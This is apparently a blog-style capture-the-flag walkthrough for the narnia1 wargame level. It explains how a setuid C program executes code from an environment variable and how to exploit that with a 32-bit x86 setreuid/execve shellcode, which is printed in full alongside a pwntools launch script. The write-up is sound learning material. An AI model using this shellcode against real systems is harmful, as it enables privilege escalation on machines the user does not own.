# narnia1

Ok so this was already interesting, because if we do not pay enough attention to the specifics of the systems **and** of the executables, we may loose a lot of time trying the wrong solutions.
Again, I will try to not give you the solution immediatly, just walk towards it step by step with a logical method to analyze the situation.

## Execute the software
Again, I would always recommend to try the executable before looking at the code. In this case, the executable prints the following sentence:
```
Give me something to execute at the env-variable EGG
```
Cool!

This guy wants something to execute in an environment variable? Well you can already maybe guess what this is doing under the hood: the software should have a way to get the content of the env-var and execute it, which in C it means a function. I'm wondering... a callback? Some pointer-to-function mechanism?

## Look at the code
Yep! There is the definition of `int (*ret)();`, which is a pointer to a function that should have a integer return type and take no arguments. In this case I think it is not really important the signature of the function, the fun part is after.
```
ret = getenv("EGG");
ret();
```
Ehehe! Now we know what is going on!
Let's brake it down though, because things are interesting here:
- We are assigning something directly to `ret`: remember that this is a **pointer** to something, so to match our types, we need the `getenv()` function to give us a pointer... and it does! The documentation states that _"t finds a match by the name we provided. If it finds a match, it returns a pointer to the C string that contains the value of that environment variable."_. Nice, so we get a pointer back, to a C string containing the real content of the env-var. Nice, we have our type match.
We then call the `ret()` function. Since this is a pointer to a function, we can do this and the compiler is happy about it because we told him that `ret` would be a function, so the `()` operator will do its job.
- Ok but... how do we set something (useful to us, I would say) to the EGG variable? This is some Linux basics stuff, let's look at it!

## Environment Variables
In Linux we have this variables which are part of our... environment, yes lol

They are usually uppercase words that contains some values (numbers, strings, etc...) and that the OS uses to perform actions of different types. For example, try to execute `echo $HOME`, you would see that it displays the path to your home folder. The `HOME` env-var is something that is attached to our user environment, so it is accessible anytime, anywhere.

But the environment can also be our terminal session! Let's try this command `export EGG=boiled`... no output mmm... ok let's print it now `echo $EGG`... It's boiled!
Now try closing the terminal and starting one again, and print the EGG variable... Who stole our egg?!

This means that we can set our env-vars whit the `export` command and we can safely forget them when we close our terminal. If you want to know more, [here](https://wiki.archlinux.org/title/Environment_variables) could be a good place to look.

## What should be in our EGG?
We know that the content of the variable will be the function that our program will execute. So we need to find some useful instructions and the previous exercise will come in handy in this case!

In level narnia0, we used a simple buffer overflow vulnerability to bypass a check and enter the branch where two particular functions were executed:
```
setreuid(geteuid(),geteuid());
system("/bin/sh");
```
Once we did this, we had access to a shell (that was running as `narnia1` user, even though we were logged with `narnia0`) where, thanks to the ability to cat the file containing narnia1 password, we were able to complete the challenge.

So... why don't we try the same thing? We should find a way to put the code of these two functions inside our EGG env-var so that the code will be executed. We use a **shellcode**!

## Shellcodes
To achieve what we want we can go two ways:
- the first one is the long way: we could take the executable of `narnia0`, disassemble it, locate the binary code that is executed by those two functions, copy it, and convert it to a more semi-human-readable format (like an hexstring)
- **OR** we could use a shellcode. A shellcode it's exactly what I described in the previous point, the binary code that executes some functions on the target machine. But since shellcodes are very useful when doing cybersecurity activities, and some people spend a lot of time trying to find ones that work and that execute really peculiar functions that are necessary in same specific case scenarios, there are a lot of databases online to look for existing ones and speed up our work.

If I were you though, I would follow the first point. You will discover a lot of interesting things about the architecture of the machine you're working with and so on. But come one we have the other challanges to do, that's homework for you if you want to try it lol

I mainly use google to search for shellcodes, but you'll end up always in the same websites that have extensive databases of shellcodes: I mainly use [Exploit Database](https://www.exploit-db.com/shellcodes) and [this amazing repository](https://github.com/7feilee/shellcode) from 7feilee.

I found what we wanted in the repo, [this particular shellcode](https://github.com/7feilee/shellcode/blob/master/Linux/x86/setreuid(geteuid()%2Cgeteuid())%2Cexecve(-bin-sh%2C0%2C0).c).

**A NOTE**: I have to be honest, I wasted a lot of time because I didn't read correctly **ALL** the info that the challenge gave me lol I was constantly looking for a shellcode that was targeting the Linux x86_64 architecture (remember, shellcodes are specific byte code instructions, hence they change from arch to arch). I did this because my friend `uname -a` gave me that information. But then, after trying a lot of shellcodes and constantly getting `Segmentation fault`s I noticed that, right when you log into the server, it says this:
```
This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro
```
And running `file /narnia/narnia0` confirmed that, here is the output:
```
/narnia/narnia1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=21fddcd93fcd02a25ca3910950aa9760890721dc, for GNU/Linux 3.2.0, not stripped
```
So, since the binary is 32-bit, we need a shellcode that's coherent, meaning targeting Linux x86 as architecture. I'm a dummy :(

ANYWAY, that being the shellcode, we can write a little python script like this one:
```
from pwn import *

shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

target = process("/narnia/narnia1", env={"EGG": shellcode})
target.interactive()
```
Another note, since I lost a lot of time here too :sad: I was initially trying to set the the env-var with the os package or the subprocess one, trying to execute the export command, like you would normally do in the terminal. Well that was a big fail, but I found out that pwntools have a way to start the subprocess with the environment explicitly set when defining the target, like you see in line 5 of the script!

We have our shell! Topperia!!

p.s. Now that you have the password, rememeber that you can run `./utils/narnia-connect.sh add <pwd>` command to add the password to the database and then use `./utils/narnia-connect.sh <level>` to quickly connect to the server as the user of the password you just got.
